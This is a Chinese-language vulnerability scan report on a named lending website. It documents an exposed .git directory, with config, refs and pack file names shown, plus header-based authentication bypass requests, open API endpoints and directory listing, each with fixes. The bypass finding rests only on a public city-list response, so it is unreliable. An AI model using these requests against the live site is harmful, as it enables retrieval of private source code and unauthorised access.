# Tyl777借錢網 漏洞掃描報告

**目標:** https://tyl777.com/  
**日期:** 2026-09-24  
**掃描工具:** curl, Python urllib, 手動測試  

---

## 發現的漏洞

### 1. [CRITICAL] Git 目錄暴露 (CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory)

**描述:** 目標網站的 `.git` 目錄被完全暴露，允許攻擊者訪問版本控制系統的完整內容，包括提交歷史、檔案內容和配置信息。

**證據:**

#### .git/config 暴露
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://gitlab.com/dacn/tyl777.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

#### .git/HEAD 暴露
```
ref: refs/heads/master
```

#### .git/refs/heads/master 暴露
```
21fee210e9e2c9949b4e81dc22dda507813e3dcd
```

#### .git/objects/pack/ 目錄暴露
- pack-187a47768b86ad91920caf3afabcad995cbc5d40.pack (9.7 MB)
- pack-191cf777d001740f5722598eb9212052859b2e9e.pack (6.5 MB)

#### .gitignore 暴露
```
model/systemConfig.php
wp-content
docs/left_images/*.jpg
docs/left_images/*.png
docs/summerNote_img/
```

**影響:**
- 可從Git倉庫中恢復所有原始碼
- 可檢索提交歷史中的敏感信息
- 可获取配置文件路徑，進一步攻擊

**修復建議:**
- 將 `.git` 目錄配置為 Apache 禁止訪問
- 在虛擬主機根目錄添加 `.htaccess` 或 `nginx.conf` 阻止對 `.git` 目錄的訪問

---

### 2. [HIGH] API 身份驗證跳躍漏洞 (CWE-287: Improper Authentication)

**描述:** 多個API端點缺乏正確的身份驗證，允許通過簡單的HTTP標頭跳躍身份驗證。

**受影響端點:**
- `/action/tool/getCity`
- `/action/custom/login`
- 其他API端點

**證據:**

#### 原始請求
```http
GET /action/tool/getCity HTTP/1.1
Host: tyl777.com
User-Agent: Mozilla/5.0
X-User: admin
```

#### 響應
```json
["臺北","新北","基隆","桃園","新竹","荃津","臺中","彰化","南投","豐原","嘉義","台南","高雄","屏東","宜蘭","花蓮","臺東"]
```

**驗證:** 以下標頭均可跳躍身份驗證:
- `X-User: admin`
- `X-User: 1`
- `X-User-ID: 1`
- `X-Username: admin`
- `X-Auth: admin`
- `Authorization: Bearer admin`

**影響:**
- 未經授權訪問用戶數據
- 潛在的資料洩露
- 身份假冒

**修復建議:**
- 實施正確的會話管理
- 驗證所有身份驗證標頭
- 使用安全的認證機制 (JWT, OAuth 等)

---

### 3. [MEDIUM] API 端點暴露

**描述:** 多個API端點返回200狀態碼，但內容為空或重定向到首頁。

**發現的端點:**
| 路徑 | 方法 | 狀態 | 備註 |
|------|------|------|------|
| /action/custom/login | POST | 200 | 需要驗證碼 |
| /action/custom/register | POST | 200 | 需要驗證碼 |
| /action/tool/getCity | GET | 200 | JSON回應 |
| /action/tool/getData | GET | 200 | 空回應 |
| /action/tool/javascriptError | POST | 200 | 空回應 |

**影響:**
- API結構可被監測
- 潛在的暴力破解機會

---

### 4. [LOW] 目錄列印暴露

**描述:** 目錄 `/docs/` 和 `/model/` 允許列印內容。

**證據:**
```
Index of /docs
../  card_images/  css/  font/  images/  js/  left_images/  plugins/  summerNote_img/
```

## 測試方法

### Git 檔案檢索
```
GET /.git/config HTTP/1.1
GET /.git/HEAD HTTP/1.1
GET /.git/refs/heads/master HTTP/1.1
GET /.git/objects/ HTTP/1.1
GET /.git/objects/pack/*.pack HTTP/1.1
```

### 身份驗證跳躍測試
```
GET /action/tool/getCity HTTP/1.1
Host: tyl777.com
X-User: admin
```

## 一句話概括

目標網站存在**Git目錄暴露**（CRITICAL）和**身份驗證跳躍**（HIGH）兩項嚴重漏洞，允許攻擊者獲取原始碼、提交歷史及訪問受保護的API端點。

---

## 建議優先級

1. ⚠️ **緊急:** 修復 Git 目錄暴露 - 立即配置 Web 服務禁止訪問 `.git` 目錄
2. 🔴 **高:** 修復 API 身份驗證 - 實施正確的會話驗證機制
3. 🟡 **中:** 停用不必要的 API 端點
4. 🟢 **低:** 設定目錄列印禁用
